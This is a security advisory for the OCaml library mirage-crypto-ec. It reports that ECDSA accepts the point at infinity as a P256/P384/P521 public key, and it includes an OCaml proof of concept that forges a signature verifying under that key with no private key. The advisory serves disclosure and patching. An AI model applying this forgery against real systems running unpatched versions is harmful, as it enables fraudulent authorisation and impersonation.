# [M] ECDSA accepts the point at infinity as a P256, P384, P521 public key

## Summary
Severity: Medium
Advisory: OSEC-2026-13
Aliases: CVE-2026-87733
Ecosystem: opam
CVSS: 6.2 (CVSS:3.1/AV:L/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N)
Published: 2026-07-27
Source: https://osv.dev/vulnerability/OSEC-2026-13
Type: osv

## Affected
- opam: `mirage-crypto-ec` — affected >=0 <2.2.0, >=0 <ca84f5ee8ede80bd1dd2aa4cd7cc90197752184e

## Details
`P256{,P384,P521}.Dsa.pub_of_octets` accepts 0x00, the encoding of the point at infinity, as a public key. The Diffie-Hellman path rejects that point (`point_of_octets`); the ECDSA path skips the same check. Under such a key a signature can be forged with no private key, as the repro shows.

The same class is treated as high severity elsewhere. CVE-2022-21449 ("Psychic Signatures", OpenJDK) let a blank ECDSA signature verify, and CVE-2020-0601 ("CurveBall", Windows CryptoAPI) accepted a crafted ECC public key for certificate validation. Both are missing-validation forgeries on the same primitive.

## Solution

Check for point at infinity in `pub_of_octets`.

## Reproduction

```OCaml
module Dsa = Mirage_crypto_ec.P256.Dsa

(* 0x00 is the SEC1 encoding of the point at infinity A a signature using it can be forged for
   any message with no private key. *)
let () =
  Mirage_crypto_rng.(set_default_generator (create ~seed:"forge" (module Fortuna)));
  let o_key = Result.get_ok (Dsa.pub_of_octets "\x00") in
  let z = Digestif.SHA256.(to_raw_string (digest_string "transfer 1000eur to mallory")) in
  let r, _ = Dsa.sign ~key:(Result.get_ok (Dsa.priv_of_octets z)) ~k:z z in
  let s = String.make 31 '\000' ^ "\001" in
  Printf.printf "0x00 accepted as a public key:    %b\n" (Result.is_ok (Dsa.pub_of_octets "\x00"));
  Printf.printf "forged (r, s=1) verifies under O:  %b\n" (Dsa.verify ~key:o_key (r, s) z)
```
